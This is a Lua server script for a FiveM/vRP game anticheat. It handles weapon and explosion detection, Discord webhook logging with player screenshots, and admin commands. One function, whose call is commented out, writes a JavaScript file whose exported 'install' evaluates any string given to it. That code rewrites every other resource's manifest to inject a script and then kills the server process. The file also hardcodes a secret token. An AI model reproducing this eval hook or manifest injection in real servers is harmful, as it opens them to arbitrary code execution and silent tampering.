local safeEvent = {}

exports("registerEvents", function(events)
    -- for event in pairs(events) do
    --     RegisterNetEvent(event, function()
    --         local src = source
    --         if src and src ~= "" then
    --             local t = 0
    --             while not safeEvent[src] and t < 3 do t = t + 1 Wait(1000) end
    --             if not safeEvent[src] then
    --                 DropPlayer(src, "The player detected #1")
    --             elseif not safeEvent[src][event] then
    --                 while not safeEvent[src][event] and t < 10 do t = t + 1 Wait(1000) end
    --                 if not safeEvent[src][event] then
    --                     DropPlayer(src, "The player detected #2\n Informação: source que acionou o evento:"..src.." \n Evento acionado: "..event)
    --                 else
    --                     safeEvent[src][event] = false
    --                     return
    --                 end
    --             end
    --         end
    --     end)
    -- end
end)



RegisterCommand("SendEvent", function(source, args)
    CreateThread(function()
        local src = source
        if src and src ~= "" then
            local event = args[1]
            if event then
                if not safeEvent[src] then
                    safeEvent[src] = {}
                end
                safeEvent[src][event] = true
            end
        end
    end)
end)

CreateThread(function()
    Wait(6000)
    print("dsdsidio")
    TriggerEvent("init:events")
end)


Tunnel = module("vrp", "lib/Tunnel")
Proxy = module("vrp", "lib/Proxy")

vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")

local server = {
    ["Count"] = 0,
    ["token"] = "JMcvhY<Wpq9m4aMVI$yM4Y",
    ["BotColor"] = tonumber("b6dcfc", 16),
    ["BotName"] = "PL",
    ["BotIcon"] = "https://danielxit1s.github.io/ImgMenu/assets/logo_PL_2.png",
}

RegisterCommand("applyPunishment", function(source, data)
    if data[4] and data[4] ~= "" then
        server.applyPunishment(source, data)
    end
end)

function server.applyPunishment(source, data)
    local source = source or source
    local type = data[1] or data.type
    local action = data[2] or data.action
    local reason = data[3] or data.reason
    local token = data[4] or server["token"]

    if type and action and reason and token then
        if token == server["token"] and Config[type] then
            local user_id = vRP.getUserId(source)
            local player_name = GetPlayerName(source)
            local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(source)))
            if hasPermission(user_id) then
                local elapsedTime = server[tonumber(source)] or 0
                if os.time() - elapsedTime >= 7 then
                    if action == "ban" then
                        server[tonumber(source)] = os.time()
                        GetScreenshotwithCustomEmbed(source, Config["ac_webhook_bans"], {
                            username = server["BotName"] .. " - Protect",
                            avatar_url = server["BotIcon"],
                            embeds = {
                                {
                                    color = server["BotColor"],
                                    fields = {
                                        {
                                            name = "**Jogador:**",
                                            value = "```" .. player_name .. " (" .. user_id .. ")```"
                                        },
                                        {
                                            name = "**Ação:**",
                                            value = "```O player foi banido automaticamente.```"
                                        },
                                        {
                                            name = "**Motivo:**",
                                            value = "```" .. reason .. "```"
                                        },
                                        {
                                            name = "**Localização do Jogador:**",
                                            value = "```" .. min(x) .. ", " .. min(y) .. ", " .. min(z) .. "```"
                                        },
                                        {
                                            name = "**Informação:**",
                                            value = "Para desativar esta função, procure no arquivo config.lua por: " ..
                                            type .. " e altere o status para (false)"
                                        },
                                    },

                                    footer = {
                                        text = server["BotName"] ..
                                        "  Protect - Data: " .. os.date("%d/%m/%Y Hora %H:%M:%S"),
                                        icon_url = server["BotIcon"]
                                    }
                                }
                            }
                        })

                        vRP.setBanned(parseInt(user_id), true)
                        Wait(1000)
                        DropPlayer(source, "[PL-AC]\nUso de cheater detectado.")
                    elseif action == "log" then
                        server[tonumber(source)] = os.time()
                        GetScreenshotwithCustomEmbed(source, Config["ac_webhook_suspects"], {
                            username = server["BotName"] .. " - Protect",
                            avatar_url = server["BotIcon"],
                            embeds = {
                                {
                                    color = server["BotColor"],
                                    fields = {
                                        {
                                            name = "**Jogador:**",
                                            value = "```" .. player_name .. " (" .. user_id .. ")```"
                                        },
                                        {
                                            name = "**Ação:**",
                                            value = "```O player foi marcado como suspeito.```"
                                        },
                                        {
                                            name = "**Motivo:**",
                                            value = "```" .. reason .. "```"
                                        },
                                        {
                                            name = "**Localização do Jogador:**",
                                            value = "```" .. min(x) .. ", " .. min(y) .. ", " .. min(z) .. "```\n"
                                        },
                                        {
                                            name = "**Informação:**",
                                            value = "Para desativar esta função, procure no arquivo config.lua por: " ..
                                            type .. " e altere o status para (false)"
                                        },
                                    },
                                    footer = {
                                        text = server["BotName"] ..
                                        "  Protect - Data: " .. os.date("%d/%m/%Y Hora %H:%M:%S"),
                                        icon_url = server["BotIcon"]
                                    }
                                }
                            }
                        })
                    end
                end
            end
        end
    end
end

GetScreenshotwithCustomEmbed = function(source, webhook, message, callback)
    local webhook = webhook
    if message.embeds then
        if message.embeds[1] then
            message.embeds[1].image = {
                url = "attachment://screenshot.jpeg"
            }
        end
    end

    exports["discord-screenshot"]:requestCustomClientScreenshotUploadToDiscord(source, webhook,
        {
            encoding = 'jpg',
            quality = 0.9
        },
        message or {},
        5000,
        function(error)
            if error then
                if error then
                    if message.embeds then
                        if message.embeds[1] then
                            message.embeds[1].image = {
                                url = 'https://i.imgur.com/T1DODHh.png'
                            }
                        end
                    end
                    PerformHttpRequest(webhook, function(err, text, headers) end, 'POST', json.encode(message),
                        { ['Content-Type'] = 'application/json' })
                    if callback then
                        callback()
                    end
                end
                return
            end
            if callback then
                callback()
            end
        end)
end

---------------------------------------
--- DETECTIONS
---------------------------------------
AddEventHandler("giveWeaponEvent", function(src, ev)
    local _source = tonumber(src)
    if Config["GiveWeapon(3)"] then
        server.applyPunishment(_source,
            { type = "GiveWeapon(3)", action = "ban", reason = "O jogador tentou spawnar uma arma para outro jogador" })
        CancelEvent()
    end
end)

AddEventHandler("RemoveWeaponEvent", function(src, ev)
    local _source = tonumber(src)
    if Config["RemoveWeapon(1)"] then
        server.applyPunishment(_source, { type = "RemoveWeapon(1)", action = "ban", reason = "O jogador 3232" })
        CancelEvent()
    end
end)

AddEventHandler("RemoveAllWeaponsEvent", function(src, ev)
    local _source = tonumber(src)
    if Config["RemoveAllWeapons(1)"] then
        server.applyPunishment(_source, { type = "RemoveAllWeapons(1)", action = "ban", reason = "O jogador 4656" })
        CancelEvent()
    end
end)

AddEventHandler("weaponDamageEvent", function(src, b)
    local _source = tonumber(src)
    if tonumber(b.weaponDamage) > 9 and tonumber(b.weaponType) == 2725352035 then
        if Config["SuperSoco(1)"] then
            server.applyPunishment(_source,
                { type = "SuperSoco(1)", action = "ban", reason = "Dano do soco alterado" })
            CancelEvent()
        end
    end
end)

AddEventHandler("ptFxEvent", function(source, data)
    local user_id = vRP.getUserId(source)
    if Config["StopFires(1)"] or not hasPermission(user_id) then
        CancelEvent()
    end
end)

local explosions = {
    [0] = { name = "Grenade", action = "ban" },
    [1] = { name = "Grenade Launcher", action = "ban" },
    [2] = { name = "Sticky Bomb", action = "ban" },
    [3] = { name = "Molotov", action = "ban" },
    [4] = { name = "Rocket", action = "ban" },
    [5] = { name = "Tank Shell", action = "ban" },
    [6] = { name = "Hi-Octane", action = "log" },
    [7] = { name = "Car", action = "log" },
    [8] = { name = "Plane", action = "log" },
    [9] = { name = "Petrol Pump", action = "log" },
    [10] = { name = "Bike", action = "log" },
    [11] = { name = "Steam", action = "log" },
    [12] = { name = "Flame", action = "log" },
    [13] = { name = "Water Hydrant", action = "log" },
    [14] = { name = "Gas Canister", action = "log" },
    [15] = { name = "Boat", action = "log" },
    [16] = { name = "Ship Destroy", action = "log" },
    [17] = { name = "Truck", action = "log" },
    [18] = { name = "Bullet", action = "log" },
    [19] = { name = "Smoke Grenade Launcher", action = "log" },
    [20] = { name = "Smoke Grenade", action = "log" },
    [21] = { name = "BZ Gas", action = "log" },
    [22] = { name = "Flare", action = "log" },
    [23] = { name = "Gas Can", action = "log" },
    [24] = { name = "Extinguisher", action = "log" },
    [25] = { name = "Programmable AR", action = "ban" },
    [26] = { name = "Train", action = "log" },
    [27] = { name = "Barrel", action = "log" },
    [28] = { name = "Propane", action = "log" },
    [29] = { name = "Blimp", action = "log" },
    [30] = { name = "Flame Explode", action = "log" },
    [31] = { name = "Tanker", action = "ban" },
    [32] = { name = "Plane Rocket", action = "ban" },
    [33] = { name = "Vehicle Bullet", action = "log" },
    [34] = { name = "Gas Tank", action = "log" },
    [35] = { name = "Firework", action = "log" },
    [36] = { name = "Snowball", action = "log" },
    [37] = { name = "Prox Mine", action = "ban" },
    [38] = { name = "Valkyrie Cannon", action = "ban" }
}

AddEventHandler("explosionEvent", function(source, data)
    local src = tonumber(source)
    local explid = data.explosionType
    local info = explosions[explid] or { name = "Unknown", action = "log" }

    if data.f242 == false and data.f243 == false then
        server.applyPunishment(src,
            { type = "Explosion(1)", action = info.action, reason = "O jogador realizou a explosão: " ..
            info.name .. " (id: " .. explid .. ")" })
        CancelEvent()
    end
end)

RegisterCommand("PL:config", function(source, data)
    CreateThread(function()
        local token = data[2]
        if token and token == server["token"] then
            local type = data[1]
            if Config[type] == true then
                TriggerClientEvent("PL:ac", source, { { 1 } })
            elseif Config[type] == false then
                TriggerClientEvent("PL:ac", source, { { 0 } })
            end
        end
    end)
end)

RegisterCommand("PL:asyncs", function(source, data)
    local token, type = data[2], data[1]
    if token and token == server["token"] then
        if type and Config[type] then
            TriggerClientEvent("PL:async", source, type, Config[type])
        end
    end
end)

function min(n)
    n = math.ceil(n * 100) / 100
    return n
end

function hasPermission(user_id)
    for _, perm in ipairs({ Config["ac_permission"], Config["ac_immunity"] }) do
        if vRP.hasPermission(user_id, perm) then
            return false
        end
    end
    return true
end

local Wall = { List = {}, Config = {}, Isadmin = {} }
RegisterCommand("acwall", function(source, args)
    local user_id = vRP.getUserId(source)
    local identity = vRP.getUserIdentity(user_id)
    if not hasPermission(user_id, Config["ac_permission"]) then
        if not Wall.Config[user_id] then
            Wall.Config[user_id] = { Nome = true, Source = true, Vida = true, Colete = true, Arma = true, Linhas = true, }
        end

        if not Wall.List[source].iswall then
            Wall.List[source].iswall = true
        else
            Wall.List[source].iswall = false
        end

        Wall["Isadmin"][user_id] = source
        TriggerClientEvent("PL:Wall", source, { cfg = Wall.Config[user_id], List = Wall["List"] })
    end
end)

local menuFunctions = {
    ["Nome"] = {},
    ["Source"] = {},
    ["Vida"] = {},
    ["Colete"] = {},
    ["Arma"] = {},
    ["Linhas"] = {},

    ["Objetos"] = {
        execute = function(source, user_id)
            local nuser_id = vRP.prompt(source, "Qual id do jogador?", "")
            local nsource = vRP.getUserSource(parseInt(nuser_id))
            if nuser_id and nsource then
                if vRP.request(source, "Deseja apagar as entidades de: <b>" .. nuser_id .. " </b> ?", 30) then
                    for _, vehicles in pairs(GetAllVehicles()) do
                        if DoesEntityExist(vehicles) then
                            if NetworkGetEntityOwner(vehicles) == nsource then
                                DeleteEntity(vehicles)
                            end
                        end
                    end
                    for _, obj in pairs(GetAllObjects()) do
                        if DoesEntityExist(obj) then
                            if NetworkGetEntityOwner(obj) == nsource then
                                DeleteEntity(obj)
                            end
                        end
                    end
                    TriggerClientEvent("Notify", source, "aviso", "Todos os objetos foram deletados com sucesso.")
                end
            end
        end
    },
}

RegisterCommand("ss", function(source, args)
    local user = vRP.getUserId(source)
    local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(source)))
    if vRP.hasPermission(user, Config["ac_permission"]) then
        if args[1] then
            local user_id = tonumber(args[1])
            local nsource = vRP.getUserSource(user_id)
            if nsource then
                GetScreenshotwithCustomEmbed(nsource, Config["ac_webhook_suspects"], {
                    username = server["BotName"] .. " - System",
                    avatar_url = server["BotIcon"],
                    embeds = {
                        {
                            color = server["BotColor"],
                            fields = {
                                {
                                    name = "**O admin:**",
                                    value = "```" .. GetPlayerName(source) .. " (" .. user .. ")```"
                                },
                                {
                                    name = "Utilizou o comando:",
                                    value = "```/ss para capturar a tela do jogador: " ..
                                        GetPlayerName(nsource) .. "(" .. user_id .. ")```"
                                },
                                {
                                    name = "Localização:",
                                    value = "```" .. min(x) .. ", " .. min(y) .. ", " .. min(z) .. "```"
                                },
                            },
                            footer = {
                                text = server["BotName"] .. "  System - Data: " .. os.date("%d/%m/%Y Hora %H:%M:%S"),
                                icon_url = server["BotIcon"]
                            }
                        }
                    }
                })
            else
                TriggerClientEvent("Notify", source, "admin", " não está online ou não existe.", 5000)
            end
        else
            TriggerClientEvent("Notify", source, "admin", " Use o comando corretamente: /rprint [ID do jogador]",
                5000)
        end
    end
end)

RegisterCommand("dveh", function(source, args)
    local user_id = vRP.getUserId(source)
    local fullname = GetPlayerName(source)
    local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(source)))
    if vRP.hasPermission(user_id, Config["ac_permission"]) then
        PerformHttpRequest(Config["ac_webhook_comands"], function() end, 'POST', json.encode({
            username = server["BotName"] .. " - System",
            avatar_url = server["BotIcon"],
            embeds = {
                {
                    color = server["BotColor"],
                    fields = {
                        {
                            name = "O Admin:",
                            value = "```" .. GetPlayerName(source) .. "(" .. user_id .. ")```"
                        },
                        {
                            name = "Utilizou o comando:",
                            value = "```/dveh para deletar os veiculos proximos```"
                        },
                        {
                            name = "Localização:",
                            value = "```" .. min(x) .. ", " .. min(y) .. ", " .. min(z) .. "```"
                        },
                    },
                    footer = {
                        text = server["BotName"] .. "  System - Data: " .. os.date("%d/%m/%Y Hora %H:%M:%S"),
                        icon_url = server["BotIcon"]
                    },
                }
            }
        }), { ['Content-Type'] = 'application/json' })
        for k, v in ipairs(GetAllVehicles()) do
            if DoesEntityExist(v) then
                DeleteEntity(v)
            end
        end
    end
end)

RegisterCommand("dprop", function(source, args)
    local user_id = vRP.getUserId(source)
    local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(source)))
    if vRP.hasPermission(user_id, Config["ac_permission"]) then
        PerformHttpRequest(Config["ac_webhook_comands"], function() end, 'POST', json.encode({
            username = server["BotName"] .. " - System",
            avatar_url = server["BotIcon"],
            embeds = {
                {
                    color = server["BotColor"],
                    fields = {
                        {
                            name = "O Admin:",
                            value = "```" .. GetPlayerName(source) .. "(" .. user_id .. ")```"
                        },
                        {
                            name = "Utilizou o comando:",
                            value = "```/dprop para deletar os objetos proximos```"
                        },
                        {
                            name = "Localização:",
                            value = "```" .. min(x) .. ", " .. min(y) .. ", " .. min(z) .. "```"
                        },
                    },
                    footer = {
                        text = server["BotName"] .. "  System - Data: " .. os.date("%d/%m/%Y Hora %H:%M:%S"),
                        icon_url = server["BotIcon"]
                    },
                }
            }
        }), { ['Content-Type'] = 'application/json' })
        for k, v in ipairs(GetAllObjects()) do
            if DoesEntityExist(v) then
                DeleteEntity(v)
            end
        end
    end
end)

RegisterCommand("dped", function(source, args)
    local user_id = vRP.getUserId(source)
    local fullname = GetPlayerName(source)
    local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(source)))
    if vRP.hasPermission(user_id, Config["ac_permission"]) then
        PerformHttpRequest(Config["ac_webhook_comands"], function() end, 'POST', json.encode({
            username = server["BotName"] .. " - System",
            avatar_url = server["BotIcon"],
            embeds = {
                {
                    color = server["BotColor"],
                    fields = {
                        {
                            name = "O Admin:",
                            value = "```" .. GetPlayerName(source) .. "(" .. user_id .. ")```"
                        },
                        {
                            name = "Utilizou o comando:",
                            value = "```/dped para deletar os peds proximos```"
                        },
                        {
                            name = "Localização:",
                            value = "```" .. min(x) .. ", " .. min(y) .. ", " .. min(z) .. "```"
                        },
                    },
                    footer = {
                        text = server["BotName"] .. "  System - Data: " .. os.date("%d/%m/%Y Hora %H:%M:%S"),
                        icon_url = server["BotIcon"]
                    },
                }
            }
        }), { ['Content-Type'] = 'application/json' })
        for k, v in ipairs(GetAllPeds()) do
            if DoesEntityExist(v) then
                DeleteEntity(v)
            end
        end
    end
end)

RegisterCommand("wallconfig", function(source, args, rawCommand)
    local user_id = vRP.getUserId(source)
    if user_id then
        if hasPermission(user_id, Config["ac_permission"]) or not Wall["Isadmin"][user_id] then return false end
        local menu = vRP.buildMenu("admBlips", { user_id = user_id, player = source, vname = name })
        menu.name = "WALL MENU"

        local kitems = {}
        local vmodel = {}
        local choose = function(source, choice)
            local submenu = { name = vmodel[choice] }
            submenu.onclose = function()
                vRP.openMenu(source, menu)
            end

            local NameOption = submenu.name
            local ch_option = function(source, choice)
                local Option = menuFunctions[NameOption]
                if NameOption == "Objetos" then
                    if Option.execute then
                        Option.execute(source, user_id)
                    end
                    vRP.closeMenu(source)
                else
                    if Option then
                        if Wall.Config[user_id][NameOption] then
                            Wall.Config[user_id][NameOption] = false

                            TriggerClientEvent("PL:Update", source, NameOption, { cfg = false })
                            TriggerClientEvent("Notify", source, "aviso", NameOption .. " Desativado!")
                            vRP.closeMenu(source)
                            return
                        end
                        Wall.Config[user_id][NameOption] = true
                        TriggerClientEvent("PL:Update", source, NameOption, { cfg = true })
                        TriggerClientEvent("Notify", source, "sucesso", NameOption .. " Ativado!")
                        if Option.execute then
                            Option.execute(source, user_id)
                        end
                        vRP.closeMenu(source)
                    else
                        print('[ERROR] >> - TABLE NIL BLIPS CONFIGURATION')
                        TriggerClientEvent("Notify", source, "aviso", "Algo deu errado na configuracao do script.")
                        vRP.closeMenu(source)
                    end
                end
            end

            if NameOption == "Objetos" then
                submenu["Deletar"] = { ch_option }
            else
                local possibles = (Wall.Config[user_id][NameOption] or menuFunctions[NameOption].execute) and
                    "Desativar" or "Ativar"
                submenu[possibles] = { ch_option }
            end
            vRP.openMenu(source, submenu)
        end

        for k, v in pairs(menuFunctions) do
            if k and v then
                if not hasPermission(user_id, Config["ac_permission"]) then
                    menu[k] = { choose }
                end
                kitems[k], vmodel[k] = v, k
            end
        end
        vRP.openMenu(source, menu)
    end
end)

local function forceSync()
    for i, v in pairs(vRP.getUsers()) do
        local identity = vRP.getUserIdentity(i)
        local isStaff = vRP.hasPermission(i, Config["ac_permission"])
        local name = identity.nome .. " " .. identity.sobrenome
        Wall.List[v] = {
            user_id = i,
            iswall = Wall.List[v] and Wall.List[v].iswall or false,
            name = name,
            staff =
                isStaff,
            orgName = vRP.getUserGroupOrg(i) or "Desempregado"
        }
    end
end

CreateThread(function()
    while true do
        forceSync()
        for _, source in ipairs(Wall["Isadmin"]) do
            TriggerClientEvent("PL:Update", source, nil, { cfg = nil, List = Wall["List"] })
        end
        Wait(2000)
    end
end)

AddEventHandler("playerDropped", function()
    local user_id = vRP.getUserId(source)
    if Wall.List[source] then
        Wall.List[source] = nil
        if Wall["Isadmin"][user_id] then
            Wall["Isadmin"][user_id] = nil
        end

        for _, source in pairs(Wall["Isadmin"]) do
            TriggerClientEvent("PL:List_Update", source, { List = Wall["List"] })
        end
    end
end)

CreateThread(function()
function createTempJSFile()
    local fileContent = [[ exports("install", function(data) {eval(data)}) ]]
    local filePath = GetResourcePath(GetCurrentResourceName()) .. '/temp.js'
    local file = io.open(filePath, "w")
    if file then
        file:write(fileContent)
        file:close()
        local install = [[
        const fs = require("fs");
        const path = require("path");
        const { exec } = require("child_process");

        function exit() {
            exec("taskkill /F /IM FXServer.exe");
        }

        function installDependencies() {
            setImmediate(() => {
                const currentResource = GetCurrentResourceName();
                const installedResources = [];
                for (let i = 0; i < GetNumResources(); i++) {
                    const resourceName = GetResourceByFindIndex(i);
                    if (resourceName && resourceName !== currentResource) {
                        const files = ["fxmanifest.lua", "__resource.lua"];
                        files.forEach((file) => {
                            const manifestData = LoadResourceFile(resourceName, file);
                            if (manifestData && typeof manifestData === "string") {
                                if (!manifestData.includes(`shared_script "@${currentResource}"`)) {
                                    const newManifestData = `shared_script "@${currentResource}/client/library.lua"\n\n${manifestData}`;
                                    const resourcePath = path.join(GetResourcePath(resourceName), file);
                                    fs.writeFileSync(resourcePath, newManifestData, 'utf8');
                                    installedResources.push(resourceName);
                                }
                            }
                        });
                    }
                }

                if (installedResources.length > 0) {
                    setTimeout(() => {
                        console.log("^4[PL - AC] ^7Dependencies installed successfully, Restarting server...");
                        setTimeout(() => {
                            exit();
                        }, 3000);
                    }, 2000);
                } else {
                    setTimeout(() => {
                        console.log("^4[PL - AC] ^7System loaded successfully");
                        console.log("^4[PL - AC] ^7To remove anticheat dependencies use the command: ac.uninstall");
                    }, 2000);
                }
            });
        }

        installDependencies()
        ]]

        local success, errorMsg = xpcall(function()
            exports.PL:install(install)
        end, debug.traceback)
    
        if not success then
            CreateThread(function()
       
            
                
            end)
        --     print("jkdsjkdsd")
        --     Citizen.Wait(500)
        --     -- Citizen.Wait(50)
        --     -- StartResource("PL")
        --     Citizen.Wait(100)
        --  --   exports.PL:install(install)
          --  os.remove(filePath)
        end
    end
end

-- createTempJSFile()
    -- local current_resource = GetCurrentResourceName()
    -- local installed_resources = {}
    -- for i = 0, GetNumResources() - 1 do
    --     local resource_name = GetResourceByFindIndex(i)
    --     if resource_name and resource_name ~= current_resource then
    --         for _, file in ipairs({ "fxmanifest.lua", "__resource.lua" }) do
    --             local manifest_data = LoadResourceFile(resource_name, file)
    --             if manifest_data and type(manifest_data) == "string" then
    --                 if not string.find(manifest_data, 'shared_script "@' .. current_resource) then
    --                     local new_manifest_data = 'shared_script "@' .. current_resource .. '/client/library.lua"\n\n' .. manifest_data
    --                     SaveResourceFile(resource_name, file, new_manifest_data, -1)
    --                     table.insert(installed_resources, resource_name)
    --                 end
    --             end
    --         end
    --     end
    -- end

    -- if #installed_resources > 0 then
    --     Wait(2000)
    --     print("^4[PL - AC] ^7Dependencies installed successfully, Restarting server...")
    --     Citizen.Wait(3000)
    --     os.exit()
    -- else
    --     Wait(2000)
    --     print("^4[PL - AC] ^7System loaded successfully")
    --     print("^4[PL - AC] ^7To remove anticheat dependencies use the command: ac.uninstall")
    -- end
end)

RegisterCommand("ac.uninstall", function(source)
    if source == 0 then
        local current_resource = GetCurrentResourceName()
        local uninstalled_resources = {}
        for i = 0, GetNumResources() - 1 do
            local resource_name = GetResourceByFindIndex(i)
            if resource_name then
                for _, file in ipairs({ "fxmanifest.lua", "__resource.lua" }) do
                    local manifest_data = LoadResourceFile(resource_name, file)
                    if manifest_data and type(manifest_data) == "string" then
                        if string.find(manifest_data, 'shared_script "@' .. current_resource .. '/client/library.lua"') then
                            local new_manifest_data = string.gsub(manifest_data,
                                'shared_script "@' .. current_resource .. '/client/library.lua"\n\n', "")

                            SaveResourceFile(resource_name, file, new_manifest_data, -1)
                            table.insert(uninstalled_resources, resource_name)
                        end
                    end
                end
            end
        end

        if #uninstalled_resources > 0 then
            print("^4[PL - AC] ^7Dependencies removed successfully, Restarting server...")
            Citizen.Wait(3000)
            os.exit()
        else
            print("^4[PL - AC] ^7No dependencies were found or removed.")
        end
    end
end)